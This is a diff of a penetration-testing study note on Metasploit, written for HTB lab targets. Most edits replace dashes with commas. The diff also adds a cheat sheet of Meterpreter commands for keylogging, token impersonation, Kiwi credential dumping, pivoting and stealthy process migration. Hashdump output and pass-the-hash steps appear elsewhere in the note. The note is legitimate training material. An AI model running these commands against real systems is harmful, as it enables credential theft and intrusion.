@@ -2,7 +2,7 @@
 
 #Metasploit #msfconsole #Meterpreter #msfdb #dbNmap #SessionManagement #PostExploitation #Hashdump #SearchFilters #EternalRomance #BaronSamedit #elFinder #FortiLogger #ApacheDruid #HTBSupplementary
 
-**HTB Using the Metasploit Framework module** — no dedicated Offsec MSF module note exists in this vault yet (Offsec PEN-200 covers MSF throughout many modules but doesn't consolidate it). This note covers all the MSF-specific mechanics the HTB module introduces as a coherent reference: database setup, search filter syntax, session management, local exploit chaining, and post-exploitation hashdump.
+**HTB Using the Metasploit Framework module**, no dedicated Offsec MSF module note exists in this vault yet (Offsec PEN-200 covers MSF throughout many modules but doesn't consolidate it). This note covers all the MSF-specific mechanics the HTB module introduces as a coherent reference: database setup, search filter syntax, session management, local exploit chaining, and post-exploitation hashdump.
 
 > 🔁 Cross-refs: [[Shells & Payloads (HTB Supplementary)#SP.4. Automating Payloads with Metasploit|SP.4 MSF psexec]], [[Shells & Payloads (HTB Supplementary)#SP.5. Infiltrating Windows|SP.5 ms17_010_psexec + EternalBlue]], [[Shells & Payloads]] (Command Appendix, multi/handler section), [[Password Attacks]] (secretsdump, hash cracking), [[Vulnerability Scanning#7.2.4. Analyzing the Results|7.2.4 MS17-010 in Nessus]]
 
@@ -47,7 +47,7 @@ services -s http                    # show all HTTP services
 creds                               # list stored credentials
 ```
 
-> 🔍 Worth remembering generally: `db_nmap` doesn't require any special syntax changes over regular Nmap — every flag you know works identically. The only difference is the results land in the database instead of just stdout. When working a multi-host network, storing results in the DB makes it easy to reference discovered services later without re-running scans.
+> 🔍 Worth remembering generally: `db_nmap` doesn't require any special syntax changes over regular Nmap, every flag you know works identically. The only difference is the results land in the database instead of just stdout. When working a multi-host network, storing results in the DB makes it easy to reference discovered services later without re-running scans.
 
 > 🔧 Technique: if `db_nmap` returns "No database connected", restart with `sudo msfdb run` instead of plain `msfconsole`. Once disconnected, you can't reconnect mid-session without restarting.
 
@@ -79,7 +79,7 @@ search hashdump post windows            # multi-keyword refinement
 search type:exploit platform:linux sudo # fully filtered search
 ```
 
-**Multi-keyword searches** don't need commas — just space-separate terms and MSF ranks results by relevance.
+**Multi-keyword searches** don't need commas, just space-separate terms and MSF ranks results by relevance.
 
 **setg vs set:**
 ```bash
@@ -88,7 +88,7 @@ setg LHOST tun0   # sets LHOST globally — persists when you switch modules
 ```
 `setg` is useful when you know LHOST won't change throughout a session. You'd still need `set RHOSTS TARGET` per module since the target changes.
 
-> 🔧 Technique: use `unsetg LHOST` to clear a global option if it starts causing problems. Global options aren't obvious from `show options` — `show global` reveals them.
+> 🔧 Technique: use `unsetg LHOST` to clear a global option if it starts causing problems. Global options aren't obvious from `show options`, `show global` reveals them.
 
 > 🔍 Worth remembering generally: if you know the CVE ID, `search CVE-XXXX-YYYY` almost always returns the right module directly, no guessing needed. If you only know the year, `search appname cve:2021` narrows it to only that year's disclosures, which is much faster than scrolling through a long list.
 
@@ -125,7 +125,7 @@ msf6 > sessions -k 1
 ```
 
 **Chain a local exploit using SESSION:**
-Some exploits (local privilege escalation modules) don't open a new listener — instead they run through an existing session you already have. These require a `SESSION` option:
+Some exploits (local privilege escalation modules) don't open a new listener, instead they run through an existing session you already have. These require a `SESSION` option:
 ```bash
 use exploit/linux/local/sudo_baron_samedit
 
@@ -144,7 +144,7 @@ set LPORT 9001       # or any free port
 # The original session on 4444 is unaffected
 ```
 
-> 🔍 Worth remembering generally: backgrounding doesn't kill a session — the Meterpreter channel stays open. A session only dies if the target process is killed, you run `sessions -k ID`, or the network connection drops. You can have dozens of backgrounded sessions and interact with each at will.
+> 🔍 Worth remembering generally: backgrounding doesn't kill a session, the Meterpreter channel stays open. A session only dies if the target process is killed, you run `sessions -k ID`, or the network connection drops. You can have dozens of backgrounded sessions and interact with each at will.
 
 **Full chaining workflow (elFinder → Baron Samedit from the module):**
 ```bash
@@ -206,7 +206,7 @@ htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c
 
 **Hash format:** `Username:RID:LM_hash:NT_hash:::`
 
-- **LM hash** (3rd field): `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash — means LM auth is disabled (standard on modern Windows). Effectively useless for cracking.
+- **LM hash** (3rd field): `aad3b435b51404eeaad3b435b51404ee` is the empty LM hash, means LM auth is disabled (standard on modern Windows). Effectively useless for cracking.
 - **NT hash** (4th field): the actual NTLM hash. This is what you crack with hashcat or use for pass-the-hash.
 
 **Extract just the NT hash from a specific user:**
@@ -228,7 +228,7 @@ impacket-psexec Administrator@TARGET_IP -hashes :bdaffbfe64f1fc646a3353be1c2c3c9
 # Format is LM_hash:NT_hash — for modern Windows, use :NT_hash (empty LM)
 ```
 
-**Alternative: smart_hashdump** — dumps domain controller hashes too if the target is a DC:
+**Alternative: smart_hashdump**, dumps domain controller hashes too if the target is a DC:
 ```bash
 use post/windows/gather/smart_hashdump
 set SESSION 1
@@ -258,7 +258,7 @@ New exploits introduced in this module (not covered elsewhere in the vault):
 
 **elFinder background:** PHP-based file manager for web servers. CVE-2021-23925 (archive injection). The module uploads a text file, creates a zip archive with a crafted name to trigger command injection, and uses the stager to deliver Meterpreter.
 
-> 🔁 Similar to: `exploit/windows/smb/ms17_010_psexec` (EternalRomance) — already documented in [[Shells & Payloads (HTB Supplementary)#SP.5. Infiltrating Windows|SP.5]] — is also searched in this module but cross-referenced rather than repeated here.
+> 🔁 Similar to: `exploit/windows/smb/ms17_010_psexec` (EternalRomance), already documented in [[Shells & Payloads (HTB Supplementary)#SP.5. Infiltrating Windows|SP.5]], is also searched in this module but cross-referenced rather than repeated here.
 
 #### Tags: #NamedExploits #ApacheDruid #elFinder #BaronSamedit #CVE20213156 #FortiLogger
 
@@ -288,7 +288,7 @@ New exploits introduced in this module (not covered elsewhere in the vault):
 - [x] MSF.4. Post-exploitation hashdump (hash format, crack or PTH)
 - [x] MSF.5. Named exploits reference (apache_druid, elfinder, baron_samedit, fortilogger)
 - [x] MSF.6. All Q&A answers
-- All hands-on labs are HTB spawnable targets only — no Offsec VM required
+- All hands-on labs are HTB spawnable targets only, no Offsec VM required
 
 ---
 
@@ -298,3 +298,105 @@ New exploits introduced in this module (not covered elsewhere in the vault):
 - **[Bashed](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)** (HTB, Linux, Easy): web shell → low-priv shell → sudo escalation. Similar structure to the Sessions & Jobs elFinder → Baron Samedit chain.
 - **[Shocker](https://0xdf.gitlab.io/2018/09/21/htb-shocker.html)** (HTB, Linux, Easy): Shellshock web RCE → sudo GTFOBin escalation. Another example of web exploit foothold + local privesc chaining, same workflow pattern as MSF.3.
 - **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Tomcat Manager WAR file → SYSTEM. Landing `nt authority\system` directly from a web exploit, same outcome as Meterpreter Q1 FortiLogger.
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# MSF SETUP & MODULE SELECTION
+# ============================================================
+msfdb init          # initialise the Postgres database
+msfconsole -q       # launch quietly (no banner)
+
+search <name>       # search for a module (name, CVE, platform)
+use <name>          # load module by path
+use <number>        # load by search result index
+info                # show full module info (description, options, refs)
+show options        # list required and optional options
+show targets        # show supported OS/service pack targets
+show advanced       # extra options (timeout, encoder, etc)
+set target <n>      # lock to a specific target index
+set payload <name>  # select payload (use show payloads first)
+
+# Common options
+set RHOSTS $BoxIP
+set LHOST $LocalIP
+set LPORT $Port
+setg RHOSTS $BoxIP  # set globally (persists across module changes)
+
+check   # non-destructive vuln check (not all modules support this)
+
+# ============================================================
+# RUNNING EXPLOITS
+# ============================================================
+exploit          # run the exploit (interactive)
+exploit -j       # run as background job (sessions -l to list)
+exploit -z       # don't interact after exploitation (useful for automation)
+exploit -e shikata_ga_nai   # specify encoder
+
+sessions -l         # list all open sessions
+sessions -l -v      # verbose (shows which module created each)
+sessions -i <id>    # interact with a session
+sessions -K         # kill all sessions
+sessions -c <cmd>   # run a command on all sessions
+sessions -u <id>    # upgrade a basic shell to Meterpreter
+sessions -s <script>   # run a Meterpreter script on all sessions
+
+# ============================================================
+# METERPRETER CORE
+# ============================================================
+sysinfo            # OS, hostname, architecture
+getuid             # current user
+getsystem          # attempt SYSTEM escalation (multiple techniques)
+ps                 # list running processes
+migrate <PID>      # migrate to another process (stability + stealth)
+shell              # drop to system shell
+background         # background this session (back to MSF)
+
+# Privilege info
+getprivs           # list enabled privileges
+use incognito      # load token impersonation
+list_tokens -u     # list impersonatable tokens by user
+impersonate_token "DOMAIN\\Administrator"   # impersonate
+
+# Files
+upload /local/path /remote/path
+download /remote/path /local/path
+ls
+cd C:\\Users\\Administrator\\Desktop
+
+# Keylogging
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# Lateral movement via portfwd
+portfwd add -l $Port -p 3389 -r 172.16.5.25   # local:$Port → internal:3389
+portfwd list
+
+# ============================================================
+# POST-EXPLOITATION MODULES
+# ============================================================
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+run post/multi/manage/autoroute   # add subnets to MSF routing table
+
+# Mimikatz / Kiwi
+load kiwi
+creds_msv         # dump NTLM hashes
+creds_kerberos    # dump Kerberos tickets
+
+# ============================================================
+# DATABASE COMMANDS
+# ============================================================
+db_nmap -sV -p- $BoxIP        # nmap with results saved to DB
+hosts                          # show discovered hosts
+services                       # show discovered services
+vulns                          # show identified vulnerabilities
+workspace                      # manage workspaces
+workspace -a <name>            # create a new workspace
+```
